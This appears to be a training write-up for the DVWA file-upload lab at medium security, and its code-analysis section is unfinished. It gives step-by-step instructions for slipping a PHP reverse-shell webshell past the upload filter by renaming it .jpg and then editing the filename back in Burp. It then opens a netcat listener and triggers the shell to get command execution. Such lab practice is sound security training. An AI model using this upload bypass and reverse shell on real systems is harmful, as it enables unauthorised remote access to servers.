# File Upload - Medium

---

## Attack Steps

1. Open Burp Suite and start a temporary project

2. Navigate to the proxy tab
    - `CTRL + SHIFT + P`

3. Ensure the intercept is off and open the chromium browser

4. Navigate to DVWA and set difficulty to medium 

    - http://<ip address>/dvwa
    - Login
    ```bash 
    admin
    password
    ```
    - Navigate to DVWA Security on the left menu 
    - Set security level to medium

5. Navigate to the target webpage 
    - http://<ip address>/dvwa/vulnerabilites/upload

6. Make a copy of `php_reverse_shell.php` and save as a jpg file:

    - `CTRL + ATL + T` to open a terminal 

    ```bash 
    sudo cp /usr/share/webshells/php/php_reverse_shell.php php_reverse_shell.jpg
    ```

7. On the target page:
    
    - Browse for `php_reverse_shell.jpg`
    - Select file 
    - DO NOT UPLOAD 

8. Turn intercept on 

    - On Burp Suite turn the intercept on to catch request

9. Upload file 

10. Edit request: 
    
    - In Burp Proxy, scroll down to filename and change to php_reverse_shell.php
    ```bash 
    filename="php_reverse_shell.php"
    ```

11. Forward the request and turn intercept off

12. On the kali terminal start a listener 

    ```bash 
    nc -lvnp 1234 # If you changed the port number in the webshell file then change it here 
    # l - listener mode
    # v - verbose output 
    # n - skip DNS resolution (faster) 
    # p <port number> - Listen on port number assigned # Change to your port number
    ```

13. Navigate to the uploaded webshell 

    - The uploaded file was saved to http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php

    - Alternatively run `curl -s http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php` in another terminal 

14. On the netcat listener look a connection
    
    - The should be output similar to the following 
    ```bash 
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    sh: no job control in this shell 
    sh-3.2$ 
    ```

    - We can now run commands on the DVWA machine

## Vulnerable Code Analysis


### File 
`/var/www/dvwa/vulnerabilities/upload/source/medium`

#### Key Vulnerability Points:

```php 

```

### Explanation
